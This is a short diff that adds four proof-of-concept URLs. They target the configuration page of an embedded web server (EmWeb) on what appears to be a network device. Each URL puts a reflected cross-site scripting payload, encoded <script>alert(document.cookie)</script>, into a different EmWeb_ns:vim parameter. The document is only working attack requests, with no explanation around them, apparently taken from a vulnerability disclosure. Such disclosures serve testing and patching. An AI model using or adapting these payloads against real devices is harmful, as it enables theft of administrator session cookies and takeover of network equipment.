@@ -1,0 +1,7 @@
+http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:9=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:10=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:11=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/configuration/lan_create_service.html?EmWeb_ns:vim:15=%3Cscript%3Ealert(document.cookie)%3C/script%3E
